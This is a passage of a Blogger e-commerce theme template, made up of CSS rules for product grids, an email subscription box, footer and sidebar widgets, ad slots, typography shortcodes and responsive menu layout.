    background: url(http://4.bp.blogspot.com/-R2WTW6O9E1o/VX7dqIGT1eI/AAAAAAAACc4/pyvQDMMLX3E/s1600/repeat-bg.png)repeat;
}
/* ####### Feature Product Css ######################### */
.featured-product {
    margin: 15px auto;
}
.featured-product .custom-title {
background: #f0f0f0;
padding: 10px 12px;
display: block;
vertical-align: middle;
margin: 0 0 10px;
font-size: 16px;
border-left: 3px solid $maincolor;
white-space: nowrap;
text-transform: uppercase;
letter-spacing: 1px;
position: relative;
overflow: hidden;
line-height: 20px;
}
.featured-product .custom-title h2 {
font-family: 'Righteous', cursive;
font-weight: normal;
color: #444;
}
.featured-product .custom-title h2:after {
content: '';
display: inline-block;
position: absolute;
height: 15px;
top: 0;
margin: 3px 0 12px 10px;
width: 100%;
background: url(http://4.bp.blogspot.com/-R2WTW6O9E1o/VX7dqIGT1eI/AAAAAAAACc4/pyvQDMMLX3E/s1600/repeat-bg.png)repeat;
}
.featured-product .custom-widget {
padding: 0;
margin: 0;
list-style:none;
}
.featured-product .custom-widget li {
width: 25%;
float: left;
box-sizing: border-box;
text-align: center;
list-style:none;
padding: 0 10px;
}
.featured-product .custom-widget li:first-child {
padding: 0 10px 0 0;
}
.featured-product .custom-widget li:nth-child(4n) {
padding: 0 0 0 10px;
}
.featured-product .custom-widget li .rcthumb {
width: 100%;
height: 320px;
padding: 0;
    display: block;
transition: all .3s ease;
}
.featured-product .custom-widget li .rcthumb:hover {
opacity: 0.3;
transform: scale(1.3);
-webkit-transform: scale(1.3);
transition: all 0.5s ease 0s;
-webkit-transition: all 0.5s ease 0s;
}
.featured-product .custom-widget .post-panel {
margin: 10px 0;
display: block;
padding:0;
}
.featured-product .custom-widget li .post-panel a {
font-size: 20px;
line-height: 20px;
font-weight: 700;
padding:0;
text-transform: capitalize;
color:#222;
font-family:Raleway;
}
.featured-product .feat-pro-thumb {
    width: 100%;
    height: auto;
    position: relative;
    display: block;
    overflow: hidden;
    background: #e5e5e5;
}
.featured-product .custom-widget .post-panel .feat-read {
    transition: all .3s;
    background: $maincolor;
    padding: 8px 16px !important;
    display: inline-block;
    vertical-align: middle;
    margin: 10px 0 0;
    font-size: 15px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: normal;
    white-space: nowrap;
    font-family: 'Righteous', cursive;
}
.featured-product .custom-widget .post-panel .feat-read i {
margin-right:5px;
}
/* ####### Random Product Css ######################### */
.random-product {
    margin: 0 auto;
}
.random-product .custom-title {
background: #f0f0f0;
padding: 10px 12px;
display: block;
vertical-align: middle;
margin: 0 0 10px;
font-size: 16px;
border-left: 3px solid $maincolor;
white-space: nowrap;
text-transform: uppercase;
letter-spacing: 1px;
position: relative;
overflow: hidden;
line-height: 20px;
}
.random-product .custom-title h2 {
font-family: 'Righteous', cursive;
font-weight: normal;
color: #444;
}
.random-product .custom-title h2:after {
content: '';
display: inline-block;
position: absolute;
height: 15px;
top: 0;
margin: 3px 0 12px 10px;
width: 100%;
background: url(http://4.bp.blogspot.com/-R2WTW6O9E1o/VX7dqIGT1eI/AAAAAAAACc4/pyvQDMMLX3E/s1600/repeat-bg.png)repeat;
}
.random-product .custom-widget {
padding: 0;
margin: 0;
list-style:none;
}
.random-product .custom-widget li {
width: 25%;
float: left;
box-sizing: border-box;
text-align: center;
list-style:none;
padding: 0 10px;
}
.random-product .custom-widget li:first-child {
padding: 0 10px 0 0;
}
.random-product .custom-widget li:nth-child(4n) {
padding: 0 0 0 10px;
}
.random-product .custom-widget li .rcthumb {
width: 100%;
height: 320px;
padding: 0;
    display: block;
transition: all .3s ease;
}
.random-product .custom-widget li .rcthumb:hover {
opacity: 0.3;
transform: scale(1.3);
-webkit-transform: scale(1.3);
transition: all 0.5s ease 0s;
-webkit-transition: all 0.5s ease 0s;
}
.random-product .custom-widget .post-panel {
margin: 10px 0;
display: block;
padding:0;
}
.random-product .custom-widget li .post-panel a {
font-size: 20px;
line-height: 20px;
font-weight: 700;
padding:0;
text-transform: capitalize;
color:#222;
font-family:Raleway;
}
.random-product .ran-pro-thumb {
    width: 100%;
    height: auto;
    position: relative;
    display: block;
    overflow: hidden;
    background: #e5e5e5;
}
.random-product .custom-widget .post-panel .ran-read {
    transition: all .3s;
    background: $maincolor;
    padding: 8px 16px !important;
    display: inline-block;
    vertical-align: middle;
    margin: 10px 0 0;
    font-size: 15px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: normal;
    white-space: nowrap;
    font-family: 'Righteous', cursive;
}
.random-product .custom-widget .post-panel .ran-read i {
margin-right:5px;
}
/* ####### Popular Product Css ######################### */
.popular-product {
    margin: 0 auto 15px;
}
.popular-product .custom-title {
background: #f0f0f0;
padding: 10px 12px;
display: block;
vertical-align: middle;
margin: 0 0 10px;
font-size: 16px;
border-left: 3px solid $maincolor;
white-space: nowrap;
text-transform: uppercase;
letter-spacing: 1px;
position: relative;
overflow: hidden;
line-height: 20px;
}
.popular-product .custom-title h2 {
font-family: 'Righteous', cursive;
font-weight: normal;
color: #444;
}
.popular-product .custom-title h2:after {
content: '';
display: inline-block;
position: absolute;
height: 15px;
top: 0;
margin: 3px 0 12px 10px;
width: 100%;
background: url(http://4.bp.blogspot.com/-R2WTW6O9E1o/VX7dqIGT1eI/AAAAAAAACc4/pyvQDMMLX3E/s1600/repeat-bg.png)repeat;
}
.popular-product .PopularPosts ul {
    padding: 0;
    margin: 0;
list-style:none;
}
.popular-product .PopularPosts ul li {
width: 25%;
    float: left;
    box-sizing: border-box;
    text-align: center;
list-style:none;
    padding: 0 10px;
}
.popular-product .PopularPosts ul li:first-child {
padding: 0 10px 0 0;
}
.popular-product .PopularPosts ul li:nth-child(4n) {
padding: 0 0 0 10px;
}
.popular-product .PopularPosts .item-thumbnail {
    float: none;
    margin: 0 ;
clear:both;
    position: relative;
}
.popular-product .PopularPosts .item-thumbnail a {
    position: relative;
    display: block;
    overflow: hidden;
    line-height: 0;
}
.popular-product .PopularPosts img {
width: 100%;
    height: 320px;
       object-fit: cover;
    padding: 0;
    transition: all .3s ease;
}
.popular-product .PopularPosts img:hover {
opacity: 0.3;
    transform: scale(1.3);
    -webkit-transform: scale(1.3);
    transition: all 0.5s ease 0s;
    -webkit-transition: all 0.5s ease 0s;
}
.popular-product .PopularPosts .item-title {
   margin: 10px 0;
    display: block;
 padding:0;
}
.popular-product .PopularPosts ul li a {
font-size: 20px;
    line-height: 20px;
    font-weight: 700;
    padding:0;
    text-transform: capitalize;
    color:#222;
font-family:Raleway;
}
.popular-product .PopularPosts .item-meta .pop-read {
    transition: all .3s;
    background: $maincolor;
    padding: 8px 16px !important;
    display: inline-block;
    vertical-align: middle;
    margin: 10px 0 0;
    font-size: 15px;
    text-transform: uppercase;
    color: #f7f7f7;
    font-weight: normal;
    white-space: nowrap;
    font-family: 'Righteous', cursive;
}
.popular-product .PopularPosts .item-meta .pop-read i {
margin-right:5px;
}
/* ####### Email Subscribe ######################### */
.email-folower {
       background: url(https://2.bp.blogspot.com/-C2ZNH3JwldA/Vupbf-HopaI/AAAAAAAADXU/xq1cJrP0LJMEylkyCr76kPNm-bxo0-7og/s1600/city-1150026_960_720.jpg) no-repeat center bottom;
    background-attachment: fixed;
    background-size: cover;
    color: #fff;
    overflow: hidden;
    padding: 60px 0;
position:relative;
}
.email-folower:before {
   content: "";
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: .7;
    background: #1c1c1c;
}
.email-folower-wrap {
    margin: 0 auto;
}
.email-folower .email-letter-text {
    float: left;
    padding: 15px 0 0;
    width: 45%;
text-align:center;
}
.email-folower .email-letter-text .subhead {
    color: #fff;
    display: inline-block;
    font-size: 25px;
    font-weight: 700;
    letter-spacing: 1px;
    text-transform: uppercase;
    word-spacing: 2px;
    margin-bottom: 10px;
    border-bottom: 1px solid #fff;
}
.email-folower .email-letter-text .subtext {
    color: #fff;
    font-size: 17px;
    line-height: 25px;
}
.email-folower .follow-by-email-inner {
    margin: 45px 0 0;
    float: right;
    width: 50%;
}
.email-folower .follow-by-email-inner {
position: relative;
}
.email-folower .follow-by-email-inner .follow-by-email-address {
-moz-box-shadow:none;
-webkit-box-shadow:none;
box-shadow: none;
border: 1px solid #fff;
color: #fff;
border-radius: 0;
font-size: 14px;
height: 44px;
padding-left: 5px;
letter-spacing: .5px;
    background: transparent;
text-transform:uppercase;
    width: 98%;
box-sizing: border-box;
}
.email-folower input::placeholder {
  color: #fff;
font-size: 14px;
}
.email-folower .follow-by-email-inner .follow-by-email-submit {
background: none;
border: 1px solid #fff;
border-radius: 0;
color: #FFF;
cursor: pointer;
font-size: 14px;
height: 44px;
margin: 0 3px;
width: 80px;
z-index: 0;
text-transform:uppercase;
font-weight:bold;
}
.email-folower .follow-by-email-inner .follow-by-email-submit:hover {
background: #fff;
border: 1px solid #efefef;
color:#010101;
}
/* ####### Multi Column Footer Css ######################### */
#lower {
margin:auto;
padding: 0;
width: 100%;
background:#2c2c2c;
}
#lower-wrapper {
margin:auto;
padding: 20px 0px 20px 0px;
border-bottom: 1px solid rgba(255,255,255,0.2);
}
#lowerbar-wrapper {
float: left;
margin: 0px 5px auto;
padding-bottom: 20px;
width: 32%;
color:#696969;
line-height: 1.6em;
word-wrap: break-word;
overflow: hidden;
max-width: 375px;
}
.lowerbar {margin: 0; padding: 0;}
.lowerbar .widget {margin: 0; padding: 10px 10px 0px 10px;box-sizing:border-box;}
.lowerbar h2 {
padding: 0;
margin: 0 0 20px;
position:relative;
}
.lowerbar h2 {
position: relative;
font-size: 14px;
font-weight: 700;
text-transform: uppercase;
letter-spacing: 2px;
padding: 0 10px 0 0;
z-index: 1;
color:#696969;
}
.lowerbar ul {
margin: 0 auto;
padding: 0;
list-style-type: none;
}
.lowerbar li {
display:block;
line-height: 1.6em;
margin-left: 0 !important;
list-style-type: none;
}
.lowerbar li a {
text-decoration:none; color: #fff;
}
.lowerbar li a:hover {
text-decoration:none;
}
.lowerbar .PopularPosts ul li a, .lowerbar .ty-bonus .ty-bonos-entry a {
color:#fff;
}
.lowerbar .PopularPosts .widget-content ul li, .lowerbar .ty-bonus .ty-wow {
border-color:#1f3b5a;
}
/* ####### Footer Css ######################### */
#ty_footer {
    background: #2c2c2c;
    color: #fff;
    font-weight: 300;
    padding: 15px 0px;
}
.ty-copy-container {
    margin: 0 auto;
    overflow: hidden;
}
.ty_footer_copyright a {
    color:#fff;
}
.ty_footer_copyright {
text-align: left;
    display: inline-block;
    line-height: 30px;
}
.ty_footer_bank_image {
    float: right;
}
/* ######## Custom Widget Css ######################### */
select#BlogArchive1_ArchiveMenu {
width: 100%;
padding: 10px;
border-color: #777;
}
.cmm-widget li .cmm-avatar {
position: relative;
overflow: hidden;
padding: 0;
width: 55px;
height: 55px;
float: left;
margin: 0 10px 0 0;
}
.cmm-widget li {
background: none!important;
clear: both;
list-style: none;
word-break: break-all;
display: block;
overflow: hidden;
margin: 0;
padding: 10px 0;
}
.cmm-widget li:first-child {
padding-top: 0;
border-top: 0;
}
.cmm-widget li:last-child {
padding-bottom: 0;
}
.cmm-widget li span {
margin-top: 4px;
color: #bdbdbd;
display: block;
line-height: 1.2em;
text-transform: lowercase;
font-size: 12px;
font-style: italic;
font-weight: 400;
}
.cmm-img {
width: 55px;
height: 55px;
float: left;
margin: 0 10px 0 0;
}
.cmm-widget a {
color: #222222;
position: relative;
font-size: 13px;
text-transform: capitalize;
display: block;
overflow: hidden;
font-weight: 400;
}
.cmm-widget a:hover {
color:#0277bd;
}
.cmm-widget {
list-style: none;
padding: 0;
}
.ty-bonus .ty-wow {
overflow: hidden;
border-bottom: 1px solid #F5F5F5;
padding: 10px 0;
}
.ty-bonus .ty-wow:first-child {
padding-top: 0;
}
.ty-bonus .ty-wow:last-child {
border-bottom: none;
}
.ty-bonus .ty-thumb-bonos {
position: relative;
float: left;
margin: 0!important;
width: 80px;
height: 60px;
overflow: hidden;
display: block;
vertical-align: middle;
}
.ty-bonus .ty-bonus-con {
padding-left: 10px;
display: table-cell;
}
.ty-bonus .ty-bonos-entry {
overflow: hidden;
line-height: 0;
margin: 0 0 2px;
padding: 0;
}
.ty-bonus .ty-bonos-entry a {
color: #222222;
font-weight: 400;
font-size: 14px;
line-height: 1.5em;
}
.ty-bonus .ty-bonos-entry a:hover {
color: #26c6da;
}
.ty-bonus .ty-thumb-bonos:hover .tyimg-lay {
background-color: rgba(40, 35, 40, 0.3);
}
.yard-auth-ty {
margin-right: 10px;
}
.yard-auth-ty::before {
content: '\f007';
font-family: fontawesome;
color: #bbb;
margin-right: 5px;
}
.yard-auth-ty,
.ty-time {
color: #bdbdbd;
font-size: 12px;
font-weight: 400;
}
.ty-time:before {
content: '\f133';
font-family: fontawesome;
color: #bbb;
margin-right: 5px;
}
.sidebar .PopularPosts .widget-content ul li:first-child,
.sidebar .ty-bonus .ty-wow:first-child {
padding-top: 0;
border-top: 0;
}
.sidebar .PopularPosts .widget-content ul li:last-child,
.sidebar .ty-bonus .ty-wow:last-child {
padding-bottom: 0;
}
.tyard-komet .ty-komet .ty-komet-tar {
position: relative;
overflow: hidden;
padding: 0;
width: 55px;
height: 55px;
float: left;
margin: 0 10px 0 0;
}
.tyard-komet .ty-komet {
background: none!important;
clear: both;
list-style: none;
word-break: break-all;
display: block;
border-top: 1px solid #F5F5F5;
border-bottom: 0 !important;
overflow: hidden;
margin: 0;
padding: 10px 0;
}
.tyard-komet .ty-komet:first-child {
padding-top: 0;
border-top: 0;
}
.tyard-komet .ty-komet:last-child {
padding-bottom: 0;
}
.tyard-komet .ty-komet span {
color: #bdbdbd;
display: block;
line-height: 1.2em;
text-transform: lowercase;
font-size: 12px;
font-style: italic;
font-weight: 400;
overflow: hidden;
background: #f9f9f9;
height: 38px;
margin-top: 5px;
box-sizing: border-box;
padding: 5px 8px;
}
.yardimg-komet {
width: 55px;
height: 55px;
float: left;
margin: 0 10px 0 0;
}
.tyard-komet a {
color: $darkcolor;
position: relative;
font-size: 13px;
text-transform: capitalize;
display: block;
overflow: hidden;
font-weight: 400;
}
.tyard-komet a:hover {
color:#26c6da;
}
.tyard-komet {
list-style: none;
padding: 0;
}
.sidebar .PopularPosts .widget-content ul li:first-child,
#sidetabs .PopularPosts .widget-content ul li:first-child {
padding-top: 0;
border-top: 0
}
.sidebar .PopularPosts .widget-content ul li:last-child,
.sidebar .ty-bonus .ty-wow:last-child,
.tab-widget .PopularPosts .widget-content ul li:last-child,
.tab-widget .ty-bonus .ty-wow:last-child {
padding-bottom: 0
}
.sidebar .FollowByEmail > h3.title,
.sidebar .FollowByEmail .title-wrap {
margin-bottom: 0
}
.sidebar .FollowByEmail td, .lowerbar .FollowByEmail td {
width: 100%;
float: left;
box-sizing: border-box
}
.sidebar .FollowByEmail .follow-by-email-inner .follow-by-email-submit, .lowerbar .FollowByEmail .follow-by-email-inner .follow-by-email-submit {
margin-left: 0;
width: 100%;
border-radius: 0;
height: 30px;
font-size: 11px;
color: #fff;
background-color: #26c6da;
font-family: inherit;
text-transform: uppercase;
font-weight: 700;
letter-spacing: 1px
}
.sidebar .FollowByEmail .follow-by-email-inner .follow-by-email-submit:hover, .lowerbar.FollowByEmail .follow-by-email-inner .follow-by-email-submit:hover {
opacity:0.8;
}
.sidebar.FollowByEmail .follow-by-email-inner .follow-by-email-address, .lowerbar .FollowByEmail .follow-by-email-inner .follow-by-email-address {
padding-left: 10px;
height: 30px;
border: 1px solid #FFF;
margin-bottom: 5px;
box-sizing: border-box;
font-size: 11px;
font-family: inherit
}
.sidebar .FollowByEmail .follow-by-email-inner .follow-by-email-address:focus, .lowerbar .FollowByEmail .follow-by-email-inner .follow-by-email-address:focus {
border: 1px solid #FFF
}
.lowerbar .FollowByEmail .widget-content, .sidebar .FollowByEmail .widget-content {
background-color: #222222;
box-sizing: border-box;
padding: 10px
}
.sidebar .FollowByEmail .widget-content:before, .lowerbar .FollowByEmail .widget-content:before {
content: "Enter your email address to subscribe to this blog and receive notifications of new posts by email.";
font-size: 11px;
color: #f2f2f2;
line-height: 1.4em;
margin-bottom: 5px;
display: block;
padding: 0 2px
}
.list-label-widget-content li {
display: block;
padding: 8px 0;
border-bottom: 1px solid #f2f2f2;
position: relative
}
.list-label-widget-content li:first-child {
padding: 0 0 8px
}
.list-label-widget-content li:last-child {
padding-bottom: 0;
border-bottom: 0
}
.list-label-widget-content li a:before {
content: '\f02c';
font-size: 13px;
color: $maincolor;
font-family: fontawesome;
margin-right: 5px;
}
.list-label-widget-content li a {
color: #222222;
font-size: 12px;
font-weight: 700;
text-transform: uppercase;
transition: color .3s
}
.list-label-widget-content li a:hover {
color: #26c6da
}
.lowerbar .list-label-widget-content li a {
color:#696969;
}
.lowerbar .list-label-widget-content li {
border-bottom: 1px solid #696969;
}
.list-label-widget-content li span:last-child {
color: #222222;
font-size: 12px;
font-weight: 700;
position: absolute;
top: 8px;
right: 0
}
.lowerbar .list-label-widget-content li span:last-child {
color: #696969;
}
.list-label-widget-content li:first-child span:last-child {
top: 2px
}
.cloud-label-widget-content {
text-align: left
}
.cloud-label-widget-content .label-count {
background: $maincolor;
color: #fff!important;
margin-left: -3px;
white-space: nowrap;
border-radius: 0;
padding: 1px 4px!important;
font-size: 12px!important;
margin-right: 5px;
transition: background .3s
}
.cloud-label-widget-content .label-size {
border:1px solid #696969;
display: block;
float: left;
font-size: 11px;
margin: 0 5px 5px 0;
transition: background .3s
}
.cloud-label-widget-content .label-size a,
.cloud-label-widget-content .label-size span {
height: 18px!important;
color: #696969;
display: inline-block;
font-size: 11px;
font-weight: 700!important;
text-transform: uppercase;
padding: 6px 8px;
transition: all .3s
}
.cloud-label-widget-content .label-size a {
padding: 6px 10px
}
.cloud-label-widget-content .label-size a:hover {
color: #fff!important
}
.cloud-label-widget-content .label-size,
.cloud-label-widget-content .label-count {
height: 30px!important;
line-height: 19px!important
}
.cloud-label-widget-content .label-size:hover {
background: $maincolor;
color: #fff!important;
    border: 1px solid #db4437;
}
.cloud-label-widget-content .label-size:hover a {
color: #fff!important
}
.cloud-label-widget-content .label-size:hover span {
background: #222222;
color: #fff!important;
cursor: pointer
}
.cloud-label-widget-content .label-size-1,
.label-size-2,
.label-size-3,
.label-size-4,
.label-size-5 {
font-size: 100%;
opacity: 10
}
.label-size-1,
.label-size-2 {
opacity: 100
}
#ads-blog .widget {
width: 728px;
max-height: 90px;
padding:0;
margin: 0px auto 15px !important;
max-width: 100%;
box-sizing: border-box;
}
#ads-blog-bottom .widget {
width: 728px;
max-height: 90px;
padding:0;
margin: 0px auto 15px !important;
max-width: 100%;
box-sizing: border-box;
}
#ads-blog-content  .widget {
text-align:center;
max-height: 90px;
padding:0;
margin: 20px auto 0 !important;
max-width: 100%;
box-sizing: border-box;
}
#ads-blog-content  .widget .widget-content {
display:inline-block;
}
.ads-blog-post-top, .ads-blog-post-bottom {
display:none;
visibility:hidden;
}
.sidebar .PopularPosts .widget-content ul li:first-child, .lowerbar .PopularPosts .widget-content ul li:first-child {
    border-top: 0;
}
.sidebar .PopularPosts .item-thumbnail, .lowerbar .PopularPosts .item-thumbnail {
    margin: 0 15px 0 0 !important;
    width: 80px;
    height: 60px;
    float: left;
    overflow: hidden;
    position: relative
}
.sidebar .PopularPosts .item-thumbnail a, .lowerbar .PopularPosts .item-thumbnail a {
    position: relative;
    display: block;
    overflow: hidden;
    line-height: 0
}
.sidebar .PopularPosts ul li img, .lowerbar .PopularPosts ul li img {
    width: 90px;
    height: 65px;
    object-fit: cover;
    padding: 0;
    transition: all .3s ease
}
.sidebar .PopularPosts .widget-content ul li, .lowerbar .PopularPosts .widget-content ul li {
    overflow: hidden;
    padding: 10px 0;
    border-top: 1px solid #f2f2f2
}
.sidebar .PopularPosts .widget-content ul li:first-child,
.sidebar .custom-widget li:first-child,
.tab-widget .PopularPosts .widget-content ul li:first-child,
.tab-widget .custom-widget li:first-child,
.lowerbar .PopularPosts .widget-content ul li:first-child,
.lowerbar .custom-widget li:first-child {
    padding-top: 0;
    border-top: 0
}
.sidebar .PopularPosts .widget-content ul li:last-child,
.sidebar .custom-widget li:last-child,
.tab-widget .PopularPosts .widget-content ul li:last-child,
.tab-widget .custom-widget li:last-child,
.lowerbar .PopularPosts .widget-content ul li:last-child,
.lowerbar .custom-widget li:last-child {
    padding-bottom: 0
}
.sidebar .PopularPosts ul li a, .lowerbar .PopularPosts .PopularPosts ul li a {
    color: #333333;
    font-weight: 400;
    font-size: 14px;
    line-height: 1.4em;
    transition: color .3s;
    font-family: Raleway;
}
.sidebar .PopularPosts ul li a:hover, .lowerbar .PopularPosts .PopularPosts ul li a:hover {
    color: #26c6da
}
.sidebar .PopularPosts .item-title, .lowerbar .PopularPosts .PopularPosts .item-title {
    margin: 0 0 4px;
    padding: 0;
    line-height: 0
}
.item-snippet {
    display: none;
    font-size: 0;
    padding-top: 0
}
.sidebar .PopularPosts ul, .lowerbar .PopularPosts .PopularPosts ul {
    counter-reset: popularcount;
    margin: 0;
    padding: 0;
}
.sidebar .PopularPosts .item-thumbnail::before, .lowerbar .PopularPosts .PopularPosts .item-thumbnail::before {
    background: rgba(0, 0, 0, 0.3);
    bottom: 0px;
    content: "";
    height: 100px;
    width: 100px;
    left: 0px;
    right: 0px;
    margin: 0px auto;
    position: absolute;
    z-index: 3;
}


]]></b:skin>
<style>
/*-------Typography and ShortCodes-------*/
.firstcharacter{float:left;color:#27ae60;font-size:75px;line-height:60px;padding-top:4px;padding-right:8px;padding-left:3px}.post-body h1,.post-body h2,.post-body h3,.post-body h4,.post-body h5,.post-body h6{margin-bottom:15px;color:#2c3e50}blockquote{font-style:italic;color:#888;border-left:5px solid #27ae60;margin-left:0;padding:10px 15px}blockquote:before{content:&#39;\f10d&#39;;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;margin-right:10px;color:#888}blockquote:after{content:&#39;\f10e&#39;;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;margin-left:10px;color:#888}.button{background-color:#2c3e50;float:left;padding:5px 12px;margin:5px;color:#fff;text-align:center;border:0;cursor:pointer;border-radius:3px;display:block;text-decoration:none;font-weight:400;transition:all .3s ease-out !important;-webkit-transition:all .3s ease-out !important}a.button{color:#fff}.button:hover{background-color:#27ae60;color:#fff}.button.small{font-size:12px;padding:5px 12px}.button.medium{font-size:16px;padding:6px 15px}.button.large{font-size:18px;padding:8px 18px}.small-button{width:100%;overflow:hidden;clear:both}.medium-button{width:100%;overflow:hidden;clear:both}.large-button{width:100%;overflow:hidden;clear:both}.demo:before{content:&quot;\f06e&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.download:before{content:&quot;\f019&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.buy:before{content:&quot;\f09d&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.visit:before{content:&quot;\f14c&quot;;margin-right:5px;display:inline-block;font-family:FontAwesome;font-style:normal;font-weight:400;line-height:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.widget .post-body ul,.widget .post-body ol{line-height:1.5;font-weight:400}.widget .post-body li{margin:5px 0;padding:0;line-height:1.5}.post-body ul li:before{content:&quot;\f105&quot;;margin-right:5px;font-family:fontawesome}pre{font-family:Monaco, &quot;Andale Mono&quot;, &quot;Courier New&quot;, Courier, monospace;background-color:#2c3e50;background-image:-webkit-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:-moz-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:-ms-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:-o-linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);background-image:linear-gradient(rgba(0, 0, 0, 0.05) 50%, transparent 50%, transparent);-webkit-background-size:100% 50px;-moz-background-size:100% 50px;background-size:100% 50px;line-height:25px;color:#f1f1f1;position:relative;padding:0 7px;margin:15px 0 10px;overflow:hidden;word-wrap:normal;white-space:pre;position:relative}pre:before{content:&#39;Code&#39;;display:block;background:#F7F7F7;margin-left:-7px;margin-right:-7px;color:#2c3e50;padding-left:7px;font-weight:400;font-size:14px}pre code,pre .line-number{display:block}pre .line-number a{color:#27ae60;opacity:0.6}pre .line-number span{display:block;float:left;clear:both;width:20px;text-align:center;margin-left:-7px;margin-right:7px}pre .line-number span:nth-child(odd){background-color:rgba(0, 0, 0, 0.11)}pre .line-number span:nth-child(even){background-color:rgba(255, 255, 255, 0.05)}pre .cl{display:block;clear:both}#contact{background-color:#fff;margin:30px 0 !important}#contact .contact-form-widget{max-width:100% !important}#contact .contact-form-name,#contact .contact-form-email,#contact .contact-form-email-message{background-color:#FFF;border:1px solid #eee;border-radius:3px;padding:10px;margin-bottom:10px !important;max-width:100% !important}#contact .contact-form-name{width:47.7%;height:50px}#contact .contact-form-email{width:49.7%;height:50px}#contact .contact-form-email-message{height:150px}#contact .contact-form-button-submit{max-width:100%;width:100%;z-index:0;margin:4px 0 0;padding:10px !important;text-align:center;cursor:pointer;background:#27ae60;border:0;height:auto;-webkit-border-radius:2px;-moz-border-radius:2px;-ms-border-radius:2px;-o-border-radius:2px;border-radius:2px;text-transform:uppercase;-webkit-transition:all .2s ease-out;-moz-transition:all .2s ease-out;-o-transition:all .2s ease-out;-ms-transition:all .2s ease-out;transition:all .2s ease-out;color:#FFF}#contact .contact-form-button-submit:hover{background:#2c3e50}#contact .contact-form-email:focus,#contact .contact-form-name:focus,#contact .contact-form-email-message:focus{box-shadow:none !important}.alert-message{position:relative;display:block;background-color:#FAFAFA;padding:20px;margin:20px 0;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;color:#2f3239;border:1px solid}.alert-message p{margin:0 !important;padding:0;line-height:22px;font-size:13px;color:#2f3239}.alert-message span{font-size:14px !important}.alert-message i{font-size:16px;line-height:20px}.alert-message.success{background-color:#f1f9f7;border-color:#e0f1e9;color:#1d9d74}.alert-message.success a,.alert-message.success span{color:#1d9d74}.alert-message.alert{background-color:#DAEFFF;border-color:#8ED2FF;color:#378FFF}.alert-message.alert a,.alert-message.alert span{color:#378FFF}.alert-message.warning{background-color:#fcf8e3;border-color:#faebcc;color:#8a6d3b}.alert-message.warning a,.alert-message.warning span{color:#8a6d3b}.alert-message.error{background-color:#FFD7D2;border-color:#FF9494;color:#F55D5D}.alert-message.error a,.alert-message.error span{color:#F55D5D}.fa-check-circle:before{content:&quot;\f058&quot;}.fa-info-circle:before{content:&quot;\f05a&quot;}.fa-exclamation-triangle:before{content:&quot;\f071&quot;}.fa-exclamation-circle:before{content:&quot;\f06a&quot;}.post-table table{border-collapse:collapse;width:100%}.post-table th{background-color:#eee;font-weight:bold}.post-table th,.post-table td{border:0.125em solid #333;line-height:1.5;padding:0.75em;text-align:left}@media (max-width: 30em){.post-table thead tr{position:absolute;top:-9999em;left:-9999em}.post-table tr{border:0.125em solid #333;border-bottom:0}.post-table tr + tr{margin-top:1.5em}.post-table tr,.post-table td{display:block}.post-table td{border:none;border-bottom:0.125em solid #333;padding-left:50%}.post-table td:before{content:attr(data-label);display:inline-block;font-weight:bold;line-height:1.5;margin-left:-100%;width:100%}}@media (max-width: 20em){.post-table td{padding-left:0.75em}.post-table td:before{display:block;margin-bottom:0.75em;margin-left:0}}
.FollowByEmail {
    clear: both;
}
.widget .post-body ol {
    padding: 0 0 0 15px;
}
.post-body ul li {
    list-style: none;
}
</style>
<style>
/* ######## Responsive Css ######################### */

@media only screen and (max-width: 1050px) {
.row {
    width: 96%;
}
.headerright, .headerleft {
    float: none;
    width: 100%;
    text-align: center;
    height: auto;
    margin: 0 auto;
    clear: both;
}
.headerleft img {
    margin: auto;
    padding-bottom: 15px;
width: auto;
}
.headerright {
    margin: 10px auto 0;
}
.header-social {
    float: left;
}
.mega-menu-wrap {
    display: block;
    width: 100%;
    float: none;
}
.mega-menu-wrap ul {
    text-align: center;
}
.mega-menu-wrap ul {
    display: none;
    height: auto;
}
.mega-menu-wrap a#pull {
    background-color: $maincolor;
    color: #fff;
    display: inline-block;
    font-size: 13px;
    font-weight: bold;
    padding: 10px 4%;
    position: relative;
    text-align: left;
    text-transform: uppercase;
    width: 94%;
    box-sizing: border-box;
}
.mega-menu-wrap a#pull:after {
    content: &quot;&quot;;
    background: url(&#39;http://2.bp.blogspot.com/-LwR9Bn5wyRQ/U10FzXsJXMI/AAAAAAAAC8M/ng-HiAmed9Q/s1600/nav-icon.png&#39;) no-repeat;
    width: 30px;
    height: 30px;
    display: inline-block;
    position: absolute;
    left: 5px;
    top: 10px;
}
.mega-menu-wrap li {
    display: block;
    float: none;
    width: 100%;
}
.mega-menu-wrap li a {
    background: #333;
    padding: 15px 20px;
    display: block;
}
.mega-menu-wrap li a:hover,
nav a:active {
    border: none;
    color: #eee;
}
.mega-menu-wrap ul li ul {
    display: block !important;
    position: relative;
    visibility: visible;
    width: 100%;
}
.mega-menu-wrap li li a {
    background-color: #555;
    color: #eee;
}
ul.megamenuid li div.megasubmenu {
    width: 100%;
}
ul.megamenuid ul.leftmenulist {
    width: 100%;
}
ul.megamenuid ul.leftmenulist a {
    color: #fff;
}
ul.megamenuid ul.rightmenulist {
    display: none!important;
}
ul.megamenuid ul.leftmenulist {
    width: 100%;
